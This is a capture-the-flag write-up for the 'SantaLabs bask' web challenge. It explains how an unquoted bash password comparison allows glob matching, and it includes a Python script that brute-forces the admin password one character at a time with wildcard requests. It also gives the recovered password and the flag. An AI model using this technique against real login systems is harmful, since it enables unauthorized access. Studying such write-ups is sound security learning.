# [HV23.08] SantaLabs bask

## Introduction

Difficulty: Medium<br>
Author: coderion

Ditch flask and complicated python. With SantaLabs bask, you can write interactive websites using good, old bash and even template your files by using dynamic scripting!

Please note that the snowflake animation upon visiting the website may not show on certain browsers and systems. In case this occurs, try another browser.

## Solution

This one was a pain, half of the time the webserver just didn't give a response, but in the end it was a relatively simple challenge.

Looking at the source we are given, we can see two different places where Logins are handled.

Once in `admin.sh`:
```bash
if [[ "$FIRST_COOKIE" == "$ADMIN_PASSWORD" ]]; then
```

and once in `post_login.sh`:
```bash
if [[ $ADMIN_PASSWORD == $POST_PASSWORD ]]; then
```

The problem here is that `post_login.sh` does not have `"` around the variables, so we can use some bash trickery to brute-force the password character by character.

```py
import requests
import string

host = "e4ec6e1b-ce79-4c8c-a76d-8f7e2e480e5b.idocker.vuln.land"
pw = ""
while True:
    for c in string.ascii_lowercase:
        print(f"\r{pw}{c}", end="")
        while True:
            resp = requests.post(f"https://{host}/login",
                    data=f"password={pw}{c}*")
            if resp.status_code == 200:
                break
        if c == "s":
            x = 1
        if "admin_token" in resp.text:
            pw += c
            break
    resp = requests.post(f"https://{host}/login", data=f"password={pw}")
    if "admin_token" in resp.text:
        print()
        break
```

This gives us  the admin password `salami`, which gives us the flag.

Flag: `HV23{gl0bb1ng_1n_b45h_1s_fun}`